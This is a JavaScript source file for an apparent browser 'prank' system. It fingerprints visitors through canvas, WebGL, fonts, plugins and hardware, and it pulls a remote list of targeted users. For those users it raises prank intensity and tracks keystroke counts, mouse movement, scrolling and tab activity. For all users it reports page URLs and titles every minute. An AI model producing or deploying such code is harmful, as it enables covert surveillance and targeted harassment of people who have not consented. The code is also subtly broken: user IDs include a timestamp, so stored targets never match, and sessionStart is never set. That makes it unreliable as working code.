// Advanced User Targeting System
// Identify and target specific users with customized prank behavior

(function() {
    'use strict';
    
    console.log('SP: Loading user targeting system...');

    class SPUserTargeting {
        constructor() {
            this.currentUser = null;
            this.targetedUsers = new Map();
            this.userProfiles = new Map();
            this.fingerprintData = {};
            this.targetingRules = {};
            
            this.init();
        }

        async init() {
            // Generate comprehensive user fingerprint
            await this.generateUserFingerprint();
            
            // Load targeting configuration
            await this.loadTargetingConfig();
            
            // Check if current user is targeted
            await this.checkTargetingStatus();
            
            // Start user behavior monitoring
            this.startBehaviorTracking();
            
            console.log('🎯 User targeting system initialized');
        }

        async generateUserFingerprint() {
            this.fingerprintData = {
                // Browser fingerprint
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // Screen fingerprint
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availableScreen: `${screen.availWidth}x${screen.availHeight}`,
                
                // Hardware fingerprint
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'unknown',
                
                // WebGL fingerprint
                webglRenderer: await this.getWebGLRenderer(),
                
                // Canvas fingerprint
                canvasFingerprint: this.getCanvasFingerprint(),
                
                // Font fingerprint
                availableFonts: await this.detectFonts(),
                
                // Browser plugins
                plugins: Array.from(navigator.plugins).map(p => p.name),
                
                // Connection info
                connectionType: navigator.connection?.effectiveType || 'unknown',
                
                // Unique identifiers
                sessionId: this.generateSessionId(),
                timestamp: Date.now()
            };

            // Generate unique user ID based on fingerprint
            this.currentUser = await this.generateUserId();
            
            console.log('👤 User fingerprint generated:', this.currentUser);
        }

        async generateUserId() {
            // Create stable hash from fingerprint data
            const fingerprintString = JSON.stringify(this.fingerprintData);
            const hash = await this.simpleHash(fingerprintString);
            return `user_${hash}_${Date.now()}`;
        }

        async simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash; // Convert to 32-bit integer
            }
            return Math.abs(hash).toString(36);
        }

        generateSessionId() {
            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        async getWebGLRenderer() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            } catch (e) {}
            return 'unknown';
        }

        getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Browser fingerprint canvas 🎯', 2, 2);
                return canvas.toDataURL().slice(-50); // Last 50 chars
            } catch (e) {
                return 'unknown';
            }
        }

        async detectFonts() {
            const baseFonts = ['monospace', 'sans-serif', 'serif'];
            const testFonts = [
                'Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Palatino',
                'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
            ];
            
            const availableFonts = [];
            
            for (const font of testFonts) {
                if (this.isFontAvailable(font, baseFonts)) {
                    availableFonts.push(font);
                }
            }
            
            return availableFonts;
        }

        isFontAvailable(font, baseFonts) {
            const testString = "mmmmmmmmmmlli";
            const testSize = '72px';
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            context.font = testSize + ' ' + baseFonts[0];
            const baselineSize = context.measureText(testString).width;
            
            context.font = testSize + ' ' + font + ', ' + baseFonts[0];
            const newSize = context.measureText(testString).width;
            
            return newSize !== baselineSize;
        }

        async loadTargetingConfig() {
            try {
                if (window.SPRemoteConfig) {
                    const config = await window.SPRemoteConfig.getConfig();
                    this.targetingRules = config.user_targeting || {};
                    
                    // Load specific user targets
                    if (config.targeted_users) {
                        config.targeted_users.forEach(target => {
                            this.targetedUsers.set(target.userId, {
                                intensity: target.intensity || 100,
                                customBehavior: target.customBehavior || {},
                                startDate: target.startDate,
                                endDate: target.endDate,
                                reason: target.reason || 'manual_target'
                            });
                        });
                    }
                }
            } catch (error) {
                console.error('Failed to load targeting config:', error);
            }
        }

        async checkTargetingStatus() {
            const isTargeted = this.targetedUsers.has(this.currentUser);
            
            if (isTargeted) {
                const targetConfig = this.targetedUsers.get(this.currentUser);
                console.log('🎯 USER IS TARGETED:', targetConfig);
                
                // Apply enhanced targeting
                this.applyTargetedBehavior(targetConfig);
                
                // Report targeting status
                await this.reportTargetingStatus(true, targetConfig);
            } else {
                // Check for pattern-based targeting
                const patternMatch = this.checkPatternTargeting();
                if (patternMatch) {
                    console.log('🎯 USER MATCHES TARGETING PATTERN:', patternMatch);
                    await this.reportTargetingStatus(true, patternMatch);
                }
            }
        }

        checkPatternTargeting() {
            const rules = this.targetingRules;
            
            // Geographic targeting
            if (rules.timezone && this.fingerprintData.timezone.includes(rules.timezone)) {
                return { type: 'timezone', intensity: 75, reason: 'geographic_match' };
            }
            
            // Device targeting
            if (rules.platform && this.fingerprintData.platform.includes(rules.platform)) {
                return { type: 'platform', intensity: 60, reason: 'device_match' };
            }
            
            // Browser targeting
            if (rules.browser && this.fingerprintData.userAgent.includes(rules.browser)) {
                return { type: 'browser', intensity: 50, reason: 'browser_match' };
            }
            
            // Time-based targeting
            const hour = new Date().getHours();
            if (rules.activeHours && rules.activeHours.includes(hour)) {
                return { type: 'time', intensity: 80, reason: 'peak_hours' };
            }
            
            return null;
        }

        applyTargetedBehavior(targetConfig) {
            const intensity = targetConfig.intensity || 100;
            
            // Increase prank frequency
            if (window.SPConfig && window.SPConfig.currentConfig) {
                window.SPConfig.currentConfig.display_frequency = intensity;
                window.SPConfig.currentConfig.preroll.frequency = intensity;
                
                // Custom video for targeted user
                if (targetConfig.customBehavior.videoId) {
                    window.SPConfig.currentConfig.preroll.videoId = targetConfig.customBehavior.videoId;
                }
                
                // Custom banner for targeted user
                if (targetConfig.customBehavior.customBanner) {
                    window.SPConfig.currentConfig.banners.targeted_banner = targetConfig.customBehavior.customBanner;
                }
            }
            
            // Enhanced data collection
            this.enableEnhancedTracking();
            
            // Custom toast messages
            if (targetConfig.customBehavior.messages) {
                this.scheduleCustomMessages(targetConfig.customBehavior.messages);
            }
        }

        enableEnhancedTracking() {
            // Track more detailed user behavior for targeted users
            this.trackKeystrokes();
            this.trackMouseMovements();
            this.trackScrollBehavior();
            this.trackTabActivity();
        }

        trackKeystrokes() {
            let keystrokeCount = 0;
            document.addEventListener('keydown', (e) => {
                keystrokeCount++;
                if (keystrokeCount % 50 === 0) { // Report every 50 keystrokes
                    this.reportTargetedUserActivity('keystrokes', { count: keystrokeCount });
                }
            });
        }

        trackMouseMovements() {
            let mouseData = [];
            document.addEventListener('mousemove', (e) => {
                mouseData.push({ x: e.clientX, y: e.clientY, time: Date.now() });
                if (mouseData.length > 100) {
                    this.reportTargetedUserActivity('mouse_patterns', { 
                        movements: mouseData.length,
                        area: this.calculateMouseArea(mouseData)
                    });
                    mouseData = [];
                }
            });
        }

        trackScrollBehavior() {
            let scrollData = [];
            window.addEventListener('scroll', () => {
                scrollData.push({
                    scrollY: window.scrollY,
                    time: Date.now()
                });
            });
            
            setInterval(() => {
                if (scrollData.length > 0) {
                    this.reportTargetedUserActivity('scroll_behavior', {
                        events: scrollData.length,
                        totalDistance: this.calculateScrollDistance(scrollData)
                    });
                    scrollData = [];
                }
            }, 30000);
        }

        trackTabActivity() {
            let isActive = true;
            let activeTime = 0;
            let startTime = Date.now();
            
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible') {
                    isActive = true;
                    startTime = Date.now();
                } else {
                    if (isActive) {
                        activeTime += Date.now() - startTime;
                        this.reportTargetedUserActivity('tab_activity', {
                            activeTime: activeTime,
                            domain: window.location.hostname
                        });
                    }
                    isActive = false;
                }
            });
        }

        calculateMouseArea(movements) {
            if (movements.length < 2) return 0;
            
            let minX = movements[0].x, maxX = movements[0].x;
            let minY = movements[0].y, maxY = movements[0].y;
            
            movements.forEach(move => {
                minX = Math.min(minX, move.x);
                maxX = Math.max(maxX, move.x);
                minY = Math.min(minY, move.y);
                maxY = Math.max(maxY, move.y);
            });
            
            return (maxX - minX) * (maxY - minY);
        }

        calculateScrollDistance(scrollData) {
            if (scrollData.length < 2) return 0;
            
            let totalDistance = 0;
            for (let i = 1; i < scrollData.length; i++) {
                totalDistance += Math.abs(scrollData[i].scrollY - scrollData[i-1].scrollY);
            }
            
            return totalDistance;
        }

        scheduleCustomMessages(messages) {
            messages.forEach((msg, index) => {
                setTimeout(() => {
                    if (window.SPToast) {
                        window.SPToast.show({
                            message: msg.text,
                            type: msg.type || 'info',
                            duration: msg.duration || 5000
                        });
                    }
                }, (index + 1) * (msg.delay || 30000));
            });
        }

        async reportTargetingStatus(isTargeted, config) {
            if (window.SPAnalytics) {
                window.SPAnalytics.trackEvent('user_targeting_status', {
                    userId: this.currentUser,
                    isTargeted: isTargeted,
                    targetConfig: config,
                    fingerprint: this.fingerprintData
                });
            }
        }

        async reportTargetedUserActivity(activityType, data) {
            if (window.SPAnalytics) {
                window.SPAnalytics.trackEvent('targeted_user_activity', {
                    userId: this.currentUser,
                    activityType: activityType,
                    data: data,
                    timestamp: Date.now(),
                    domain: window.location.hostname
                });
            }
        }

        startBehaviorTracking() {
            // General behavior tracking for all users
            setInterval(() => {
                this.collectBehaviorSnapshot();
            }, 60000); // Every minute
        }

        collectBehaviorSnapshot() {
            const snapshot = {
                userId: this.currentUser,
                domain: window.location.hostname,
                url: window.location.href,
                timestamp: Date.now(),
                activeTime: Date.now() - this.sessionStart,
                documentTitle: document.title,
                userInteractions: this.getUserInteractionCount()
            };
            
            if (window.SPAnalytics) {
                window.SPAnalytics.trackEvent('behavior_snapshot', snapshot);
            }
        }

        getUserInteractionCount() {
            // This would be tracked by event listeners
            return {
                clicks: this.clickCount || 0,
                keystrokes: this.keystrokeCount || 0,
                scrolls: this.scrollCount || 0
            };
        }

        // Public methods for dashboard control
        getCurrentUser() {
            return this.currentUser;
        }

        isUserTargeted() {
            return this.targetedUsers.has(this.currentUser);
        }

        getTargetingIntensity() {
            if (this.isUserTargeted()) {
                return this.targetedUsers.get(this.currentUser).intensity;
            }
            return 0;
        }

        getUserFingerprint() {
            return this.fingerprintData;
        }
    }

    // Initialize user targeting
    window.SPUserTargeting = new SPUserTargeting();
    
})(); 